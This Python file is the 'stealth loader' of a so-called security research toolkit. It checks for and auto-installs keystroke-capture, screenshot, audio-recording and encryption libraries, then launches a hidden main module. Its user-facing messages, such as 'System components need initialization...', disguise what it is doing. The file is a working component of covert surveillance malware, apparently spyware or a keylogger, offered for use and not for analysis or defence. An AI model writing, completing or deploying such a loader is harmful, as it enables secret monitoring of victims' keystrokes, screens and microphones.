#!/usr/bin/env python3
"""
Stealth loader for the security research toolkit.
Handles auto-installation and launches main functionality.
"""
import os
import sys
import time
import threading
from pathlib import Path

# Import enhanced installer
from core.enhanced_installer import EnhancedInstaller

def check_dependencies():
    """Check if required packages are installed."""
    required_modules = ['pynput', 'pyscreenshot', 'sounddevice', 'cryptography']
    missing = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    return missing

def install_if_needed():
    """Install Python, pip, and dependencies if missing."""
    missing = check_dependencies()
    
    if missing:
        print("System components need initialization...")
        installer = EnhancedInstaller()
        success = installer.install_dependencies()
        
        if not success:
            print("Some components failed to initialize. Continuing anyway...")
        
        # Verify installation
        verification = installer.verify_installation()
        missing_modules = [mod for mod, available in verification.items() if not available]
        
        if missing_modules:
            print(f"Warning: Some components still missing: {missing_modules}")
    
    return len(missing) == 0

def launch_main():
    """Launch the main toolkit."""
    try:
        # Import and run main functionality
        from main import main
        main()
    except Exception as e:
        print(f"System error: {e}")
        time.sleep(5)

def main():
    """Main stealth loader function."""
    # Check and install dependencies
    install_if_needed()
    
    # Launch main toolkit
    launch_main()

if __name__ == "__main__":
    main() 